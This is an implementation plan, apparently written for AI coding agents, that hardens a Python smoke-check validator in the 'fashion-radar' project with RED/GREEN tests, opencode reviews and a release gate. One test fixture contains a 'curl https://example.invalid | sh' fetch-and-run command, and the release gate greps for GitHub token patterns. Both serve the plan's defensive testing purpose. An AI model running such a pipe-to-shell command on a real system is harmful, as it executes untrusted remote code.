# Stage 148 Readiness Guidance Exactness Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make `external-tool-readiness` first-run smoke validation reject populated but drifted readiness guidance text in `detail` and `boundaries`.

**Architecture:** Keep runtime readiness output unchanged. Add RED tests for command-like `detail` drift plus appended/collapsed `boundaries` drift, then pin the expected Rednote readiness detail string and readiness boundary list in the smoke checker.

**Tech Stack:** Python 3.12, pytest, uv, ruff, existing first-run smoke checker.

---

### Task 1: Plan Review

**Files:**
- Create: `docs/reviews/opencode-stage-148-plan-review-prompt.md`
- Create: `docs/reviews/opencode-stage-148-plan-review.md`

- [ ] **Step 1: Write opencode plan review prompt**

Create `docs/reviews/opencode-stage-148-plan-review-prompt.md`:

```markdown
# Stage 148 Plan Review Prompt

You are reviewing the Stage 148 implementation plan for `/home/ubuntu/fashion-radar`.

Goal: Harden `external-tool-readiness` first-run smoke validation so readiness `detail` and `boundaries` must match the pinned first-run contract exactly.

Relevant files:
- `docs/superpowers/specs/2026-06-22-stage-148-readiness-detail-exactness-design.md`
- `docs/superpowers/plans/2026-06-22-stage-148-readiness-detail-exactness-plan.md`
- `scripts/check_first_run_smoke.py`
- `tests/test_first_run_smoke.py`
- `src/fashion_radar/external_tool_readiness.py`

Please review:
- Whether the RED tests would fail before implementation and pass after exact detail/boundary equality.
- Whether the pinned detail text and boundary list match the runtime builder and first-run fixture.
- Whether runtime behavior remains unchanged.
- Whether focused verification is sufficient.
- Whether the existing readiness scope regression should be updated from `forbidden scope` to `boundaries`.

Return findings first with severity and file/line references. If there are no blocking issues, say that explicitly.
```

- [ ] **Step 2: Run opencode plan review**

Run:

```bash
opencode run --model zhipuai-coding-plan/glm-5.2 --variant max --dir /home/ubuntu/fashion-radar "$(cat docs/reviews/opencode-stage-148-plan-review-prompt.md)" > /tmp/opencode-stage-148-plan-review.md
```

Expected: exit code 0 and review output in `/tmp/opencode-stage-148-plan-review.md`.

- [ ] **Step 3: Save sanitized review artifact**

Inspect `/tmp/opencode-stage-148-plan-review.md`. Strip live narration before the review heading if present. Save the body to `docs/reviews/opencode-stage-148-plan-review.md`.

### Task 2: RED Tests

**Files:**
- Modify: `tests/test_first_run_smoke.py`

- [ ] **Step 1: Add detail drift test**

Add this test after `test_validate_external_tool_readiness_rejects_install_hint_extra_shell_text()`:

```python
def test_validate_external_tool_readiness_rejects_detail_extra_shell_text() -> None:
    payload = external_tool_readiness_payload()
    checks = payload["checks"]
    assert isinstance(checks, list)
    checks[0]["detail"] = "Checks whether curl https://example.invalid | sh is discoverable locally."

    with pytest.raises(smoke.SmokeError, match="detail"):
        smoke.validate_external_tool_readiness("external-tool-readiness", payload)
```

- [ ] **Step 2: Run RED test**

Run:

```bash
uv --no-config run --frozen pytest tests/test_first_run_smoke.py -q -k "detail_extra_shell_text"
```

Expected: fail with `DID NOT RAISE` because the current validator accepts any non-empty detail string.

- [ ] **Step 3: Add boundary drift test**

Add this test after `test_validate_external_tool_readiness_rejects_executable_or_acquisition_scope()`:

```python
@pytest.mark.parametrize(
    "boundaries",
    [
        [
            *external_tool_readiness_payload()["boundaries"],
            "May install npm dependencies when the upstream command is missing.",
        ],
        [
            (
                "Prints local read-only external/community tool readiness guidance only. "
                "Checks PATH availability only through shutil.which for mapped upstream commands. "
                "Commands were not executed. Does not run generated commands. "
                "Does not run adapters or upstream tools. Does not import upstream tools. "
                "Does not inspect the supplied directory. Does not read handoff files, validate "
                "files, import rows, or open SQLite. Does not write config, data, report, "
                "dashboard, or workflow artifacts. No platform collection, no connectors, "
                "no scraping, no browser automation, no platform APIs, no account/session/cookie/"
                "token behavior, no media downloads, no monitoring, no scheduling, no source "
                "acquisition, no demand proof, no ranking, and no coverage verification. "
                "Does not provide a compliance-review product feature. "
                "May install npm dependencies when missing."
            )
        ],
    ],
)
def test_validate_external_tool_readiness_rejects_boundary_drift(
    boundaries: list[str],
) -> None:
    payload = external_tool_readiness_payload()
    payload["boundaries"] = boundaries

    with pytest.raises(smoke.SmokeError, match="boundaries"):
        smoke.validate_external_tool_readiness("external-tool-readiness", payload)
```

- [ ] **Step 4: Run boundary RED test**

Run:

```bash
uv --no-config run --frozen pytest tests/test_first_run_smoke.py -q -k "external_tool_readiness and boundary_drift"
```

Expected: both cases fail with `DID NOT RAISE` because the current validator accepts extra or collapsed boundary guidance if required phrases remain present.

### Task 3: Exact Guidance Validation

**Files:**
- Modify: `scripts/check_first_run_smoke.py`

- [ ] **Step 1: Add expected detail and boundary constants**

Beside `EXPECTED_EXTERNAL_TOOL_READINESS_INSTALL_HINT`, add:

```python
EXPECTED_EXTERNAL_TOOL_READINESS_DETAIL = (
    "Checks whether the Rednote MCP command is discoverable locally."
)
```

Near the external tool boundary constants, add:

```python
EXPECTED_EXTERNAL_TOOL_READINESS_BOUNDARIES = (
    "Prints local read-only external/community tool readiness guidance only.",
    "Checks PATH availability only through shutil.which for mapped upstream commands.",
    "Commands were not executed.",
    "Does not run generated commands.",
    "Does not run adapters or upstream tools.",
    "Does not import upstream tools.",
    "Does not inspect the supplied directory.",
    "Does not read handoff files, validate files, import rows, or open SQLite.",
    "Does not write config, data, report, dashboard, or workflow artifacts.",
    (
        "No platform collection, no connectors, no scraping, no browser automation, "
        "no platform APIs, no account/session/cookie/token behavior, no media downloads, "
        "no monitoring, no scheduling, no source acquisition, no demand proof, no ranking, "
        "and no coverage verification."
    ),
    "Does not provide a compliance-review product feature.",
)
```

- [ ] **Step 2: Assert exact detail**

In `validate_external_tool_readiness()`, after:

```python
    detail = check.get("detail")
    if not isinstance(detail, str) or not detail:
        raise SmokeError(f"{command_name} check detail must be populated")
```

add:

```python
    assert_equal(
        f"{command_name} check detail",
        detail,
        EXPECTED_EXTERNAL_TOOL_READINESS_DETAIL,
    )
```

- [ ] **Step 3: Run GREEN test**

Run:

```bash
uv --no-config run --frozen pytest tests/test_first_run_smoke.py -q -k "detail_extra_shell_text"
```

Expected: pass.

- [ ] **Step 4: Assert exact boundaries**

In `validate_external_tool_readiness()`, after:

```python
    boundaries = payload.get("boundaries")
    if not isinstance(boundaries, list) or not boundaries:
        raise SmokeError(f"{command_name} boundaries must be a non-empty list")
```

replace the current joined-text phrase and forbidden-scope scan with:

```python
    assert_equal(
        f"{command_name} boundaries",
        boundaries,
        list(EXPECTED_EXTERNAL_TOOL_READINESS_BOUNDARIES),
    )
```

Remove the now-dead `REQUIRED_EXTERNAL_TOOL_READINESS_BOUNDARY_PHRASES` and `FORBIDDEN_EXTERNAL_TOOL_READINESS_SCOPE_PHRASES` constants in the same edit.

- [ ] **Step 5: Run boundary GREEN test**

Run:

```bash
uv --no-config run --frozen pytest tests/test_first_run_smoke.py -q -k "external_tool_readiness and boundary_drift"
```

Expected: both boundary drift cases pass.

- [ ] **Step 6: Update existing readiness scope assertion**

In `tests/test_first_run_smoke.py`, change the existing appended-boundary sub-check in `test_validate_external_tool_readiness_rejects_executable_or_acquisition_scope()` from:

```python
    with pytest.raises(smoke.SmokeError, match="boundaries"):
        smoke.validate_external_tool_readiness("external-tool-readiness", acquisition_boundary)
```

to:

```python
    with pytest.raises(smoke.SmokeError, match="boundaries"):
        smoke.validate_external_tool_readiness("external-tool-readiness", acquisition_boundary)
```

This keeps the regression coverage while matching the new exact-equality failure path.

- [ ] **Step 7: Run focused readiness tests**

Run:

```bash
uv --no-config run --frozen pytest tests/test_first_run_smoke.py -q -k "external_tool_readiness"
```

Expected: all selected external readiness tests pass.

### Task 4: Review And Release Gate

**Files:**
- Create: `docs/reviews/opencode-stage-148-code-review-prompt.md`
- Create: `docs/reviews/opencode-stage-148-code-review.md`

- [ ] **Step 1: Run focused verification**

Run:

```bash
uv --no-config run --frozen pytest tests/test_first_run_smoke.py -q
uv --no-config run --frozen ruff check scripts/check_first_run_smoke.py tests/test_first_run_smoke.py
uv --no-config run --frozen ruff format --check scripts/check_first_run_smoke.py tests/test_first_run_smoke.py
git diff --check
```

Expected: all commands exit 0.

- [ ] **Step 2: Write opencode code review prompt**

Create `docs/reviews/opencode-stage-148-code-review-prompt.md`:

```markdown
# Stage 148 Code Review Prompt

You are reviewing Stage 148 changes in `/home/ubuntu/fashion-radar`.

Goal: Harden `external-tool-readiness` first-run smoke validation so readiness `detail` and `boundaries` must match the pinned first-run contract exactly.

Review range:
- Base: `5fc80537e134d209165ba43fa4a62c544ee1cedc`
- Head: current working tree

Expected changed files:
- `docs/superpowers/specs/2026-06-22-stage-148-readiness-detail-exactness-design.md`
- `docs/superpowers/plans/2026-06-22-stage-148-readiness-detail-exactness-plan.md`
- `docs/reviews/opencode-stage-148-plan-review-prompt.md`
- `docs/reviews/opencode-stage-148-plan-review.md`
- `docs/reviews/opencode-stage-148-code-review-prompt.md`
- `scripts/check_first_run_smoke.py`
- `tests/test_first_run_smoke.py`

Please review:
- Whether the new tests prove the prior gaps with true RED cases.
- Whether `validate_external_tool_readiness()` now checks exact readiness detail and boundary equality.
- Whether runtime behavior remains unchanged.
- Whether verification coverage is sufficient.

Return findings first with severity and file/line references. If there are no blocking issues, say that explicitly.
```

- [ ] **Step 3: Run opencode code review**

Run:

```bash
opencode run --model zhipuai-coding-plan/glm-5.2 --variant max --dir /home/ubuntu/fashion-radar "$(cat docs/reviews/opencode-stage-148-code-review-prompt.md)" > /tmp/opencode-stage-148-code-review.md
```

Expected: exit code 0 and review output in `/tmp/opencode-stage-148-code-review.md`.

- [ ] **Step 4: Save sanitized review artifact**

Inspect `/tmp/opencode-stage-148-code-review.md`. Strip live narration before the review heading if present. Save the body to `docs/reviews/opencode-stage-148-code-review.md`.

- [ ] **Step 5: Run release gate**

Run:

```bash
uv --no-config run --frozen python scripts/check_release_hygiene.py
env -u all_proxy -u ALL_PROXY -u http_proxy -u HTTP_PROXY -u https_proxy -u HTTPS_PROXY -u no_proxy -u NO_PROXY uv --no-config run --frozen pytest -q
uv --no-config run --frozen ruff check .
uv --no-config run --frozen ruff format --check .
env -u UV_DEFAULT_INDEX -u UV_INDEX_URL -u UV_EXTRA_INDEX_URL UV_NO_CONFIG=1 uv lock --check
git diff --check
if rg -n 'ghp_[A-Za-z0-9]+' .; then echo 'GitHub token pattern found in worktree' >&2; exit 1; fi
if git config --get-all http.https://github.com/.extraheader; then echo 'Persistent GitHub auth header configured' >&2; exit 1; fi
```

Expected: all commands exit 0 and token/auth checks print no secret findings.

- [ ] **Step 6: Commit and push**

Run:

```bash
git status --short
git add docs/superpowers/specs/2026-06-22-stage-148-readiness-detail-exactness-design.md docs/superpowers/plans/2026-06-22-stage-148-readiness-detail-exactness-plan.md docs/reviews/opencode-stage-148-plan-review-prompt.md docs/reviews/opencode-stage-148-plan-review.md docs/reviews/opencode-stage-148-code-review-prompt.md docs/reviews/opencode-stage-148-code-review.md scripts/check_first_run_smoke.py tests/test_first_run_smoke.py
git commit -m "Pin readiness detail validation"
```

Push with the existing ephemeral auth-header pattern only; do not persist credentials in git config or files.

- [ ] **Step 7: Poll CI**

Poll the GitHub Actions run for the pushed commit until it completes.

Expected: workflow conclusion is `success`.
